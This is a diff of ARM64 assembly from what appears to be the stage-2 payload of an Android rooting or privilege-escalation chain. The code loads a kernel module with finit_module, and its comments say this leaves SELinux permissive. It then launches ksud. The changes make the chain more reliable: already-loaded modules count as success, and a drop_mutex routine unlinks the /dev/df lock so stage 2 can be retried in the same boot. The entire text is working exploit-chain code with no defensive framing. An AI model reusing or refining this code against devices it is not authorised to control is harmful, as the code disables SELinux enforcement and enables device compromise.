@@ -23,6 +23,8 @@ logcat_path:
     .asciz "/system/bin/logcat"
 root_path:
     .asciz "/"
+mutex_path:
+    .asciz "/dev/df"
 mark_modprobe:
     .asciz "/dev/dfm0"
 mark_mod_fail:
@@ -168,14 +170,21 @@ matched:
     mov     x8, #SYS_openat
     svc     0
     mov     x26, x0         // save lib fd
+    tbnz    w0, #31, mod_load_fail
 
     // finit_module
     adr x1, mod_args
     mov x2, xzr
     mov x8, #SYS_finit_module
     svc 0
-    cbnz w0, mod_load_fail
+    cbz w0, mod_loaded
+    // EEXIST: the module is already in this kernel, so SELinux is already
+    // permissive. Continue instead of failing the whole pass.
+    cmn w0, #17
+    b.eq mod_loaded
+    b    mod_load_fail
 
+mod_loaded:
     // close lib fd
     mov     x0, x26
     mov     x8, #SYS_close
@@ -188,9 +197,7 @@ mod_load_fail:
     // The module refused to load (vermagic/KMI). Loading ksud anyway would
     // leave SELinux enforcing and the chain would die silently later.
     create_mark mark_mod_fail
-    mov     x0, #1
-    mov     x8, #SYS_exit
-    svc     #0
+    b    drop_mutex
 
 mod_ok:
 
@@ -407,23 +414,32 @@ s2_wait_ksud:
     b myexit
 15:
     create_mark mark_exec_fail
+    b    drop_mutex
 
 myexit:
     mov x0, #1
     mov x8, #SYS_exit
     svc #0
 
-ns_fail:
-    create_mark mark_ns_fail
+// Any hard failure after the module is in the kernel still holds the /dev/df
+// mutex, which is O_EXCL and lives until reboot: the next attempt would be
+// blocked forever. Drop it so the app can re-enter stage 2 in this boot.
+drop_mutex:
+    mov x0, -100
+    adr x1, mutex_path
+    mov x8, #SYS_unlinkat
+    svc 0
     mov x0, #1
     mov x8, #SYS_exit
     svc #0
 
+ns_fail:
+    create_mark mark_ns_fail
+    b    drop_mutex
+
 bind_fail:
     create_mark mark_bind_fail
-    mov x0, #1
-    mov x8, #SYS_exit
-    svc #0
+    b    drop_mutex
 
 return_now:
     ldr x30, [sp], #16
